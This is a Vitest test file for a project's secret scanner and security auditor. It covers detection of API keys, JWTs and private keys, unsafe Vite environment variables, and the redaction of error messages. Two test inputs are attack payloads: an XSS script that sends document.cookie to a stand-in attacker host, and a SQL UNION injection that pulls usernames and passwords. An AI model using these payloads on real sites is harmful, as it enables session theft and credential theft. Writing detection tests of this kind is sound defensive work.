import { describe, it, expect } from 'vitest';
import { SecretScanner } from '../../../src/security/SecretScanner';
import { SecurityAuditor } from '../../../src/security/SecurityAuditor';

describe('Security & Vulnerability Auditing', () => {
  describe('Secret Scanner', () => {
    it('detects exposed Google Gemini API keys and masks them', () => {
      const codeSnippet = 'const GEMINI_KEY = "AIzaSyD-ABC1234567890abcdefghijklmnopqrst";';
      const findings = SecretScanner.scanContent(codeSnippet);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].patternName).toBe('GOOGLE_GEMINI_API_KEY');
      expect(findings[0].severity).toBe('CRITICAL');
      // Verifies masking: raw secret should not be in masked snippet
      expect(findings[0].maskedSnippet).not.toContain('AIzaSyD-ABC1234567890abcdefghijklmnopqrst');
      expect(findings[0].maskedSnippet).toContain('AIz');
      expect(findings[0].maskedSnippet).toContain('st');
    });

    it('detects JWT tokens in source or configuration files', () => {
      const jwtSnippet =
        'const bearer = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.doNotLeakThisSignature";';
      const findings = SecretScanner.scanContent(jwtSnippet);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].patternName).toBe('JWT_BEARER_TOKEN');
    });

    it('detects RSA private key header blocks', () => {
      const rsaSnippet = '-----BEGIN RSA PRIVATE KEY-----\nMIIEowIBAAKCAQEA0...';
      const findings = SecretScanner.scanContent(rsaSnippet);

      expect(findings.length).toBeGreaterThan(0);
      expect(findings[0].patternName).toBe('RSA_PRIVATE_KEY');
    });
  });

  describe('Security Auditor', () => {
    it('identifies insecure Vite environment variable configuration', () => {
      const envWithExposure = {
        VITE_PUBLIC_URL: 'https://astrocare.nasa.gov',
        VITE_GEMINI_API_KEY: 'AIzaSyD-secret-token', // Vulnerable!
        SUPABASE_SERVICE_ROLE_KEY: 'server-only-token', // Safe (no VITE_ prefix)
      };

      const audit = SecurityAuditor.auditEnvironmentVariables(envWithExposure);
      expect(audit.hasExposedSecrets).toBe(true);
      expect(audit.leaks[0]).toContain('VITE_GEMINI_API_KEY');
    });

    it('flags malicious XSS and script injection attacks', () => {
      const scriptPayload = '<script>fetch("https://attacker.site?c=" + document.cookie)</script>';
      const check = SecurityAuditor.validateInputSanitization(scriptPayload);

      expect(check.isSafe).toBe(false);
      expect(check.detectedThreats.length).toBeGreaterThan(0);
    });

    it('flags SQL injection payloads in query filters', () => {
      const sqlPayload = "' UNION ALL SELECT username, password FROM users --";
      const check = SecurityAuditor.validateInputSanitization(sqlPayload);

      expect(check.isSafe).toBe(false);
    });

    it('sanitizes error messages to redact authorization tokens', () => {
      const sensitiveError = new Error('Request to /api failed with Bearer secret-auth-token-12345');
      const sanitized = SecurityAuditor.sanitizeErrorMessage(sensitiveError);

      expect(sanitized.isSafe).toBe(false);
      expect(sanitized.sanitized).toContain('Bearer [REDACTED]');
      expect(sanitized.sanitized).not.toContain('secret-auth-token-12345');
    });
  });
});
